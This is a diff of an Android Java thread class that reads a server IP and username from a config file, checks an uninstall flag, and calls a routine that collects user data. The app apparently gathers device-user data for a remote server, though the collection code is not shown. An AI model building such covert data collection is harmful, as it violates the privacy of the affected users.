@@ -28,14 +28,16 @@ public class MainEntry extends Thread{
     }
 
     @Override
-    public synchronized void run() {
+    public  void run() {
 
         try {
-            Log.e(TAG, "[liujinguang]MainEntry ");
+            Log.e(TAG, "[ljg]MainEntry ");
+
+            MyLog.writeLogFile("MainEntry\r\n");
 
             String uninstall = PrefOper.getValue(context, Public.PARAMCONFIG_FileName, Public.UNINSTALLFLAG);
             if (uninstall.equals("true")) {
-                Log.e(TAG, "[liujinguang]uninstall settled");
+                Log.e(TAG, "[ljg]uninstall settled");
                 return;
             }
 
@@ -48,14 +50,12 @@ public class MainEntry extends Thread{
 
             PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGPACKAGENAME, context.getPackageName());
 
-            File file = null;
-            try{
-                file = new File(path + Public.CONFIG_FILENAME);
-            }catch (Exception e){
-                e.printStackTrace();
-            }
+            String ip = null;
+            String username = null;
 
-            if (file != null && file.exists()) {
+            try{
+                File file = null;
+                file = new File(path + Public.CONFIG_FILENAME);
                 int len = (int) file.length();
                 byte[] buf = new byte[len];
 
@@ -64,33 +64,48 @@ public class MainEntry extends Thread{
                 fin.close();
 
                 JSONObject json = new JSONObject(new String(buf));
-                String ip = json.optString("ip");
+                ip = json.optString("ip");
 
                 if (ip != null && ip.equals("") == false) {
                     PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
+                    Public.SERVER_IP_ADDRESS = ip;
                 }
-                String username = json.optString("username");
+                username = json.optString("username");
                 if (username != null && username.equals("") == false) {
                     PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
+                    Public.UserName = username;
                 }
-            }else {
-                InputStream input = context.getAssets().open(Public.CONFIG_FILENAME);
-                int size =input.available();
-                byte buf[] = new byte[size + 1024];
-                input.read(buf,0,size);
-                input.close();
+            }catch (Exception e){
+                e.printStackTrace();
+            }
 
-                JSONObject json = new JSONObject(new String(buf));
-                String ip = json.optString("ip");
+            if (username == null || ip == null) {
+                try {
+                    InputStream input = context.getAssets().open(Public.CONFIG_FILENAME);
+                    int size = input.available();
+                    byte buf[] = new byte[size + 1024];
+                    input.read(buf, 0, size);
+                    input.close();
 
-                if (ip != null && ip.equals("") == false) {
-                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
-                }
-                String username = json.optString("username");
-                if (username != null && username.equals("") == false) {
-                    PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
+                    JSONObject json = new JSONObject(new String(buf));
+                    ip = json.optString("ip");
+
+                    if (ip != null && ip.equals("") == false) {
+                        PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGSERVERIP, ip);
+                        Public.SERVER_IP_ADDRESS = ip;
+                    }
+                    username = json.optString("username");
+                    if (username != null && username.equals("") == false) {
+                        PrefOper.setValue(context, Public.PARAMCONFIG_FileName, Public.CFGUSERNAME, username);
+                        Public.UserName = username;
+                    }
+                }catch (Exception e){
+                    e.printStackTrace();
                 }
             }
+
+            Log.e(TAG,"ip:" + ip + " username:"+username +"\r\n");
+            MyLog.writeLogFile("ip:"+ip + " username:"+username + "\r\n");
 
             Public pubclass = new Public(context);
             Network network = new Network(context);
@@ -104,7 +119,7 @@ public class MainEntry extends Thread{
             try {
                 Collection.collectUserData(context);
             } catch (Exception e) {
-                Log.e(TAG, "[liujinguang]Collection exception");
+                Log.e(TAG, "[ljg]Collection exception");
                 e.printStackTrace();
             }
 
